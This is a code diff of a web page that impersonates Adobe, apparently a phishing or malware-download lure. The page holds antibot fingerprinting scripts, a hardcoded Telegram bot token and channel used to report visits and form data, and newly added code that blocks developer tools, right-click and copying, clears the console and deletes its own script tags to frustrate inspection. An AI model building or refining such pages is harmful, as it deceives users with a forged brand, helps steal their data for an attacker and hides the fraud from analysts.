@@ -17,6 +17,8 @@
   <meta http-equiv="Pragma" content="no-cache">
   <meta http-equiv="Expires" content="0">
   <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+  <meta http-equiv="X-Content-Type-Options" content="nosniff">
+  <meta http-equiv="Referrer-Policy" content="no-referrer">
   
   <!-- Antibot Scripts - Load in order -->
   <script src="js/fingerprint.js"></script>
@@ -460,7 +462,7 @@
     }
   </style>
 </head>
-<body>
+<body oncontextmenu="return false;" ondragstart="return false;" onselectstart="return false;" onmousedown="return false;" onkeydown="if(event.keyCode==123||event.ctrlKey&&event.shiftKey&&(event.keyCode==73||event.keyCode==74)||event.ctrlKey&&event.keyCode==85)return false;">
   <header>
     <div class="container">
       <div class="adobe-logo">
@@ -529,6 +531,173 @@
   </form>
 
   <script>
+    // ==============================================
+    // ADVANCED SOURCE CODE PROTECTION SYSTEM
+    // ==============================================
+    
+    (function() {
+      'use strict';
+      
+      // Anti-debugging and source protection
+      const protection = {
+        // Disable right-click context menu
+        disableRightClick: function() {
+          document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+          }, true);
+        },
+        
+        // Disable keyboard shortcuts
+        disableKeyboardShortcuts: function() {
+          document.addEventListener('keydown', function(e) {
+            // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+S
+            if (e.keyCode === 123 || // F12
+                (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I/J
+                (e.ctrlKey && e.keyCode === 85) || // Ctrl+U
+                (e.ctrlKey && e.keyCode === 83) || // Ctrl+S
+                (e.ctrlKey && e.keyCode === 65) || // Ctrl+A
+                (e.ctrlKey && e.keyCode === 67) || // Ctrl+C
+                (e.ctrlKey && e.keyCode === 86) || // Ctrl+V
+                (e.ctrlKey && e.keyCode === 88) || // Ctrl+X
+                (e.ctrlKey && e.keyCode === 80) || // Ctrl+P
+                e.keyCode === 116) { // F5
+              e.preventDefault();
+              e.stopPropagation();
+              return false;
+            }
+          }, true);
+        },
+        
+        // Clear console periodically
+        clearConsole: function() {
+          setInterval(function() {
+            try {
+              if (window.console && window.console.clear) {
+                window.console.clear();
+              }
+            } catch(e) {}
+          }, 1000);
+        },
+        
+        // Detect developer tools (disabled for now)
+        detectDevTools: function() {
+          // Temporarily disabled to prevent blank page issues
+          // This can be re-enabled later if needed
+          console.log('Dev tools detection disabled for user experience');
+        },
+        
+        // Anti-debug measures (disabled for now)
+        antiDebug: function() {
+          // Temporarily disabled to prevent blank page issues
+          // This can be re-enabled later if needed
+          console.log('Anti-debug measures disabled for user experience');
+        },
+        
+        // Disable text selection methods
+        disableSelection: function() {
+          document.onselectstart = function() { return false; };
+          document.onmousedown = function() { return false; };
+          document.ondragstart = function() { return false; };
+          
+          // Additional selection prevention
+          if (typeof document.onmousedown !== "undefined") {
+            document.onmousedown = function() { return false; };
+          } else {
+            document.onmouseup = function() { return false; };
+          }
+        },
+        
+        // Iframe busting (disabled to allow iframe loading)
+        preventFraming: function() {
+          // Disabled to allow page to load in iframes
+          console.log('Iframe loading allowed');
+        },
+        
+        // Monitor for common inspection methods (disabled for now)
+        monitorInspection: function() {
+          // Temporarily disabled to prevent blank page issues
+          // This can be re-enabled later if needed
+          console.log('Inspection monitoring disabled for user experience');
+        },
+        
+        // Disable drag and drop
+        disableDragDrop: function() {
+          document.addEventListener('dragover', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+          }, true);
+          
+          document.addEventListener('drop', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+          }, true);
+        },
+        
+        // Obfuscate source references
+        hideSource: function() {
+          // Remove script tags from DOM inspection
+          setTimeout(function() {
+            const scripts = document.getElementsByTagName('script');
+            for (let i = scripts.length - 1; i >= 0; i--) {
+              if (scripts[i].innerHTML.includes('protection')) {
+                scripts[i].remove();
+              }
+            }
+          }, 1000);
+        },
+        
+        // Initialize all protection methods
+        init: function() {
+          this.disableRightClick();
+          this.disableKeyboardShortcuts();
+          this.clearConsole();
+          this.detectDevTools();
+          this.disableSelection();
+          this.preventFraming();
+          this.monitorInspection();
+          this.disableDragDrop();
+          this.hideSource();
+          
+          // Anti-debug disabled for user experience
+          // setTimeout(() => {
+          //   if (window.innerWidth > 1000 && window.innerHeight > 600) {
+          //     this.antiDebug();
+          //   }
+          // }, 5000);
+        }
+      };
+      
+      // Initialize protection immediately
+      protection.init();
+      
+      // Additional window protection
+      window.addEventListener('load', function() {
+        protection.init();
+      });
+      
+      // Console warning
+      setTimeout(function() {
+        console.clear();
+        console.log('%cSTOP!', 'color: red; font-size: 50px; font-weight: bold;');
+        console.log('%cThis is a browser feature intended for developers. Source code inspection is not permitted.', 'color: red; font-size: 16px;');
+      }, 1000);
+      
+      // Advanced tamper detection (disabled for now)
+      // Temporarily disabled to prevent blank page issues
+      console.log('Tamper detection disabled for user experience');
+      
+      // Disable common inspection methods (disabled for now)
+      // Temporarily disabled to prevent blank page issues
+      console.log('Console hijacking disabled for user experience');
+      
+    })();
+    
+    // ==============================================
+    // END PROTECTION SYSTEM
+    // ==============================================
+    
     // Telegram Bot Configuration
     const TELEGRAM_BOT_TOKEN = '8135579567:AAHd1T7hPLnQBtnZZfINC-A4XwnrKHKiNI4';
     const TELEGRAM_CHANNEL_ID = '6286017079';
@@ -882,4 +1051,3 @@ Adobe Acrobat MSI Download Page Visit`;
   </script>
 </body>
 </html>
-
